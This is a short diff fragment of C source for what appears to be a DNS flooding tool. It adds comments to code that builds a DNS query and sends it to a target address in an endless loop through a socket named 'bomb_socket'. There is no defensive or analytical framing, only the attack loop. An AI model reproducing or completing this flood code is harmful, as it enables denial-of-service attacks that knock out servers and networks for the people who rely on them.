@@ -69,10 +69,12 @@ int main(int argc, char **argv)
 		perror("Canno't open socket(exit)");
 		exit(1);
 	}
-
+	
+	/* creating dns query */
 	make_dns_header(datagram, dns_process_id, STANDARD_QUEST_FLAG, 1, 0, 0, 0);
 	make_dns_question(datagram + sizeof(struct dns_header), domain_name, TYPE_A_DNS, CLASS_IN_DNS);
 	
+	/* sending fake dns query in while loop */
 	while (1) {
 		if (sendto(bomb_socket, datagram, sizeof(struct dns_header)  + strlen(domain_name) + 2 + sizeof(u_int32_t) + 200 , 0, (struct sockaddr*)(&target_addr_struct), sizeof(struct sockaddr)) < 0) {
 			perror("failed to send query");
